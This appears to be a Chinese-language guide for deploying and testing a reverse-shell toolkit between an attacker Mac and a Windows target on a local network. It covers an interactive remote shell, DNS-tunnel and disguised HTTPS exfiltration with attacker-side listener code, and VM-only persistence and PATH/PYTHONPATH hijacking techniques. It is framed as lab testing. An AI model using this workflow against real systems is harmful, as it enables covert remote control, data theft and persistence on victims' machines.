# 部署与测试指南

## 环境要求

| 机器           | 系统          | 角色            |
| -------------- | ------------- | --------------- |
| Mac            | macOS         | 攻击者 / 监听端 |
| Windows        | Windows 10/11 | 目标机器        |
| （可选）虚拟机 | Windows/Linux | 全功能测试专用  |

两台机器需在同一局域网（同一 WiFi 或有线连接）。

---

## 第一步：获取 Mac 的局域网 IP

```bash
ifconfig | grep "inet " | grep -v 127
```

找到类似 `192.168.1.xxx` 的地址，后续替换 `<MAC_IP>`。

---

## 第二步：克隆项目

**Mac：**

```bash
git clone https://github.com/joyzhang14-14/reverseShell.git
cd reverseShell
```

**Windows（PowerShell）：**

```powershell
git clone https://github.com/joyzhang14-14/reverseShell.git
cd reverseShell
```

---

## 第三步：安装依赖

```bash
pip install -r requirements-fl.txt
```

（`ForTarget.py` 只用标准库，无需额外安装）

---

## 第四步：修改 Windows 测试脚本的 IP

打开 `test_safe.py`（或 `test_full_vm_only.py`），将第 11 行改为你的 Mac IP：

```python
MAC_IP = '192.168.1.xxx'   # 改成你的 Mac IP
```

---

## 功能测试

### 功能一：交互式 Shell（核心功能）

**Mac — 新开一个终端，启动监听：**

```bash
python3 listener.py
```

**Windows — 运行安全测试脚本，选 1：**

```powershell
python test_safe.py
# 输入 1 -> 回车
```

连接成功后，Mac 的 `listener.py` 终端里就可以直接输入命令控制 Windows cmd。
输入 `exit` 断开，Windows 端会自动重连。

---

### 功能二：DNS 隧道

**Mac — 启动 DNS 服务端（新终端）：**

```bash
python3 dns_tunnel_server.py --bind 0.0.0.0 --port 5353
```

**Windows — 选 2，输入任意内容：**

```
选择功能: 2
输入要通过 DNS 隧道发送的内容: hello
```

Mac 终端会打印收到的 QNAME（十六进制编码的内容）。

---

### 功能三：HTTPS 伪装请求

需要 Mac 有一个 HTTP 服务接收 POST 请求，最简单用 Python 临时起一个：

**Mac（新终端）：**

```bash
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        l = int(self.headers.get('Content-Length', 0))
        print(self.rfile.read(l).decode())
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'ok')
    def log_message(self, *a): pass
HTTPServer(('0.0.0.0', 4444), H).serve_forever()
"
```

**Windows — 选 4。**

---

### 功能四：LOTL 借壳

直接在 Windows 选 5，输入命令（如 `whoami`），会通过 curl 或 PowerShell 执行并返回结果。

---

## 全功能测试（仅限虚拟机）

> **警告：以下操作会修改系统文件，只在虚拟机中执行。**

在虚拟机里运行：

```powershell
python test_full_vm_only.py
```

| 选项 | 功能            | 影响的文件                             |
| ---- | --------------- | -------------------------------------- |
| 6    | bashrc 持久化   | `~/.bashrc`                            |
| 7    | crontab 持久化  | 用户 crontab                           |
| 8    | PATH 劫持       | `/tmp/reverse_shell/bin/python`        |
| 9    | PYTHONPATH 劫持 | 当前进程环境变量                       |
| 10   | 启动脚本注入    | `~/.bashrc` `~/.zshrc` `~/.profile` 等 |
| 11   | DNS 隧道脚本    | `/tmp/reverse_shell_dns.py`            |

每个危险操作都有二次确认，输入 `y` 才会执行。

---

## 文件说明

```
reverseShell/
├── ForTarget.py            # 目标机器运行：反向 Shell 核心（含全部功能）
├── dns_tunnel_server.py    # Mac 运行：DNS 隧道服务端
├── listener.py             # Mac 运行：TCP 监听端（替代 nc，支持重连）
├── test_safe.py            # Windows 物理机运行：安全测试入口
├── test_full_vm_only.py    # 虚拟机运行：全功能测试入口
├── fl_coordinator.py       # 联邦学习协调端
├── fl_worker.py            # 联邦学习工作端
└── README-FL.md            # 联邦学习部署说明
```

---

## 常见问题

**连接超时 / 无法连接**

- 确认两台机器在同一局域网
- Mac 防火墙：系统设置 → 防火墙 → 关闭，或添加 Python 例外
- Windows 防火墙：允许 Python 的入站/出站规则

**Windows 报错 `ModuleNotFoundError`**

- 确认在 `reverseShell` 目录下运行，`ForTarget.py` 和测试脚本在同一文件夹

**DNS 隧道没有收到数据**

- 确认 `dns_tunnel_server.py` 用 `--bind 0.0.0.0` 启动（不是 `127.0.0.1`）
- 确认 `test_safe.py` 里 `MAC_IP` 填的是局域网 IP，不是 `127.0.0.1`
